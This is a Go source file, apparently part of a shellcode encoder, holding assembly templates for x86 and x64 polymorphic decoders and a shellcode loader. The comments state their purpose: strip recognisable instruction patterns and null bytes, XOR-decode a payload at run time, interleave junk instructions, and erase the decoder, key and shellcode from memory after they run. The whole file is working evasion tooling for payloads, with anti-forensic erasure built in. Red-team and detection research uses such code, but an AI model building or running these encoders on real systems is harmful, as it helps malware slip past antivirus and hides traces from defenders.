package ssce

import (
	"encoding/hex"
	"fmt"
	"strings"
)

// The role of the mini decoder is to eliminate the
// instruction sequence features as much as possible.

var x86MiniDecoder = `
.code32

// eax store the random seed
// ebx store the crypto key
// ecx store the loop times
// edx store the xor shift median
// esi store the body address
// edi store the current value

header:
  // save context
  pushad                                       {{igi}}
  pushfd                                       {{igi}}

  mov {{.Reg.eax}}, {{hex .Seed}}              {{igi}}
  mov {{.Reg.ebx}}, {{hex .Key}}               {{igi}}

  // prevent continuous 0x00
  mov {{.Reg.ecx}}, {{hex .NumLoopStub}}       {{igi}}
  xor {{.Reg.ecx}}, {{hex .NumLoopMaskA}}      {{igi}}
  xor {{.Reg.ecx}}, {{hex .NumLoopMaskB}}      {{igi}}

  // for prevent "E8 00 00 00 00"
  call calc_body_addr
 flag_CEA:                                              {{igi}}
  add {{.Reg.esi}}, body - flag_CEA + {{hex .OffsetT}}  {{igi}}
  add {{.Reg.esi}}, {{hex .OffsetA}}                    {{igi}}
  sub {{.Reg.esi}}, {{hex .OffsetS}}                    {{igi}}

 loop_xor:
  // xor block data
  mov {{.Reg.edi}}, [{{.Reg.esi}}]             {{igi}}
  ror {{.Reg.edi}}, 5                          {{igi}}
  xor {{.Reg.edi}}, {{.Reg.eax}}               {{igi}}
  rol {{.Reg.edi}}, 17                         {{igi}}
  xor {{.Reg.edi}}, {{.Reg.ebx}}               {{igi}}
  mov [{{.Reg.esi}}], {{.Reg.edi}}             {{igi}}

  // update address and counter
  call xor_shift_32                            {{igi}}
  add {{.Reg.esi}}, 4                          {{igi}}
  dec {{.Reg.ecx}}                             {{igi}}
  jnz loop_xor                                 {{igi}}

  // restore context
  popfd                                        {{igi}}
  popad                                        {{igi}}

  // go to the shellcode body
  jmp body                                     {{igi}}

calc_body_addr:
  pop  {{.Reg.esi}}                            {{igi}}
  push {{.Reg.esi}}                            {{igi}}
  ret                                          {{igi}}

xor_shift_32:
  mov {{.Reg.edx}}, {{.Reg.eax}}               {{igi}}
  shl {{.Reg.edx}}, 13                         {{igi}}
  xor {{.Reg.eax}}, {{.Reg.edx}}               {{igi}}
  mov {{.Reg.edx}}, {{.Reg.eax}}               {{igi}}
  shr {{.Reg.edx}}, 17                         {{igi}}
  xor {{.Reg.eax}}, {{.Reg.edx}}               {{igi}}
  mov {{.Reg.edx}}, {{.Reg.eax}}               {{igi}}
  shl {{.Reg.edx}}, 5                          {{igi}}
  xor {{.Reg.eax}}, {{.Reg.edx}}               {{igi}}
  ret                                          {{igi}}

body:
`

var x64MiniDecoder = `
.code64

// NOT use R register for prevent appear
// a lot of instruction prefix about 0x48

// dr is used to get the register low 32bit

// eax store the random seed
// ebx store the crypto key
// ecx store the loop times
// edx store the xor shift median
// rsi store the body address
// edi store the current value

header:
  // save context
  push {{.Reg.rax}}                            {{igi}}
  push {{.Reg.rbx}}                            {{igi}}
  push {{.Reg.rcx}}                            {{igi}}
  push {{.Reg.rdx}}                            {{igi}}
  push {{.Reg.rsi}}                            {{igi}}
  push {{.Reg.rdi}}                            {{igi}}
  pushfq                                       {{igi}}

  mov {{dr .Reg.rax}}, {{hex .Seed}}           {{igi}}
  mov {{dr .Reg.rbx}}, {{hex .Key}}            {{igi}}

  // prevent continuous 0x00
  mov {{dr .Reg.rcx}}, {{hex .NumLoopStub}}    {{igi}}
  xor {{dr .Reg.rcx}}, {{hex .NumLoopMaskA}}   {{igi}}
  xor {{dr .Reg.rcx}}, {{hex .NumLoopMaskB}}   {{igi}}

  // calculate the body address
  lea {{.Reg.rsi}}, [rip + body + {{hex .OffsetT}}]   {{igi}}
  add {{.Reg.rsi}}, {{hex .OffsetA}}                  {{igi}}
  sub {{.Reg.rsi}}, {{hex .OffsetS}}                  {{igi}}

 loop_xor:
  // xor block data
  mov {{dr .Reg.rdi}}, [{{.Reg.rsi}}]          {{igi}}
  ror {{dr .Reg.rdi}}, 17                      {{igi}}
  xor {{dr .Reg.rdi}}, {{dr .Reg.rax}}         {{igi}}
  rol {{dr .Reg.rdi}}, 7                       {{igi}}
  xor {{dr .Reg.rdi}}, {{dr .Reg.rbx}}         {{igi}}
  mov [{{.Reg.rsi}}], {{dr .Reg.rdi}}          {{igi}}

  // update address and counter
  call xor_shift_32                            {{igi}}
  add {{.Reg.rsi}}, 4                          {{igi}}
  dec {{dr .Reg.rcx}}                          {{igi}}
  jnz loop_xor                                 {{igi}}

  // restore context
  popfq                                        {{igi}}
  pop {{.Reg.rdi}}                             {{igi}}
  pop {{.Reg.rsi}}                             {{igi}}
  pop {{.Reg.rdx}}                             {{igi}}
  pop {{.Reg.rcx}}                             {{igi}}
  pop {{.Reg.rbx}}                             {{igi}}
  pop {{.Reg.rax}}                             {{igi}}

  // go to the shellcode body
  jmp body

xor_shift_32:
  mov {{dr .Reg.rdx}}, {{dr .Reg.rax}}         {{igi}}
  shl {{dr .Reg.rdx}}, 13                      {{igi}}
  xor {{dr .Reg.rax}}, {{dr .Reg.rdx}}         {{igi}}
  mov {{dr .Reg.rdx}}, {{dr .Reg.rax}}         {{igi}}
  shr {{dr .Reg.rdx}}, 17                      {{igi}}
  xor {{dr .Reg.rax}}, {{dr .Reg.rdx}}         {{igi}}
  mov {{dr .Reg.rdx}}, {{dr .Reg.rax}}         {{igi}}
  shl {{dr .Reg.rdx}}, 5                       {{igi}}
  xor {{dr .Reg.rax}}, {{dr .Reg.rdx}}         {{igi}}
  ret                                          {{igi}}

body:
`

type miniDecoderCtx struct {
	Seed interface{}
	Key  interface{}

	NumLoopStub  int32
	NumLoopMaskA int32
	NumLoopMaskB int32

	OffsetT int32
	OffsetA int32
	OffsetS int32

	// for replace registers
	Reg map[string]string
}

// The role of the shellcode loader is to execute the shellcode
// without destroying the CPU context, and to erase the loader
// before execution and the shellcode after execution.

var x86Loader = `
.code32

entry:
  ret
`

var x64Loader = `
.code64

entry:
  // save context and prepare the environment
  {{db .JumpShort}}                            // random jump short
  {{db .SaveContext}}                          // save GP registers
  push rbx                                     // store rbx for save entry address
  push rbp                                     // store rbp for save stack address
  mov rbp, rsp                                 // create new stack frame
  and rsp, 0xFFFFFFFFFFFFFFF0                  // ensure stack is 16 bytes aligned
  sub rsp, 0x200                               // reserve stack
  fxsave [rsp]                                 // save FP registers

  // calculate the entry address
  lea rbx, [rip + entry]

  // save arguments for call shellcode
  push rcx
  push rdx
  push r8
  push r9

  // decode instructions in stub and erase them
  call decode_stubs
  call decode_shellcode
  call erase_decoder_stub
  call erase_crypto_key_stub

  // erase useless functions and entry
 flag_eraser_1:
  lea rcx, [rbx + mini_xor]          {{igi}}
  mov rdx, decoder_stub - mini_xor   {{igi}}
  call eraser_stub                   {{igi}}

  mov rcx, rbx                       {{igi}}
  mov rdx, flag_eraser_1             {{igi}}
  call eraser_stub                   {{igi}}

  // restore arguments for call shellcode
  pop r9                             {{igi}}
  pop r8                             {{igi}}
  pop rdx                            {{igi}}
  pop rcx                            {{igi}}

  // execute the shellcode
  sub rsp, 0x80                      {{igi}}
  call shellcode_stub                {{igi}}
  add rsp, 0x80                      {{igi}}

  // save the shellcode return value
  push rax                           {{igi}}

  // erase the shellcode stub
{{if .EraseShellcode}}
  lea rcx, [rbx + shellcode_stub]    {{igi}}
  mov rdx, {{hex .ShellcodeLen}}     {{igi}}
  call eraser_stub                   {{igi}}
{{end}}

  // erase the above instructions
 flag_eraser_2:
  mov rcx, rbx                       {{igi}}
  mov rdx, flag_eraser_2             {{igi}}
  call eraser_stub                   {{igi}}

  // erase the eraser stub (27 byte)
  lea rdi, [rbx + eraser_stub]       {{igi}}
  lea rsi, [rbx + crypto_key_stub]   {{igi}}
  mov rcx, {{hex .EraserLen}}        {{igi}}
  cld                                {{igi}}
  rep movsb                          {{igi}}

  // restore the shellcode return value
  pop rax                            {{igi}}

  fxrstor [rsp]                      {{igi}}   // restore FP registers
  add rsp, 0x200                     {{igi}}   // reserve stack
  mov rsp, rbp                       {{igi}}   // restore stack address
  pop rbp                            {{igi}}   // restore rbp
  pop rbx                            {{igi}}   // restore rbx
  {{db .RestoreContext}}                       // restore GP registers
  ret                                {{igi}}   // return to the caller

// rcx = data address, rdx = data length, r8 = key.
// this function assumes that the data length is divisible by 8.
mini_xor:
  shr rdx, 3     // rdx /= 8
  loop_xor:
  xor [rcx], r8
  add rcx, 8
  dec rdx
  jnz loop_xor
  ret

decode_stubs:
  mov r8, {{hex .StubKey}}

  lea rcx, [rbx + decoder_stub]
  mov rdx, eraser_stub - decoder_stub
  call mini_xor

  lea rcx, [rbx + eraser_stub]
  mov rdx, crypto_key_stub - eraser_stub
  call mini_xor

  lea rcx, [rbx + crypto_key_stub]
  mov rdx, shellcode_stub - crypto_key_stub
  call mini_xor
  ret

decode_shellcode:
  lea rcx, [rbx + shellcode_stub]
  mov rdx, {{hex .ShellcodeLen}}
  lea r8, [rbx + crypto_key_stub]
  mov r9, {{hex .CryptoKeyLen}}
  sub rsp, 0x40
  call decoder_stub
  add rsp, 0x40
  ret

erase_decoder_stub:
  lea rcx, [rbx + decoder_stub]
  mov rdx, eraser_stub - decoder_stub
  call eraser_stub
  ret

erase_crypto_key_stub:
  lea rcx, [rbx + crypto_key_stub]
  mov rdx, shellcode_stub - crypto_key_stub
  call eraser_stub
  ret

decoder_stub:
  {{db .DecoderStub}}                {{igi}}

eraser_stub:
  {{db .EraserStub}}                 {{igi}}

crypto_key_stub:
  {{db .CryptoKeyStub}}              {{igi}}

shellcode_stub:
`

type loaderCtx struct {
	JumpShort      []byte
	SaveContext    []byte
	RestoreContext []byte

	StubKey interface{}

	DecoderStub   []byte
	EraserStub    []byte
	CryptoKeyStub []byte

	CryptoKeyLen int
	ShellcodeLen int
	EraserLen    int

	EraseShellcode bool
}

func toDB(b []byte) string {
	if len(b) == 0 {
		return ""
	}
	builder := strings.Builder{}
	builder.WriteString(".byte ")
	for i := 0; i < len(b); i++ {
		builder.WriteString("0x")
		s := hex.EncodeToString([]byte{b[i]})
		builder.WriteString(strings.ToUpper(s))
		builder.WriteString(", ")
	}
	return builder.String()
}

func toHex(v interface{}) string {
	return fmt.Sprintf("0x%X", v)
}
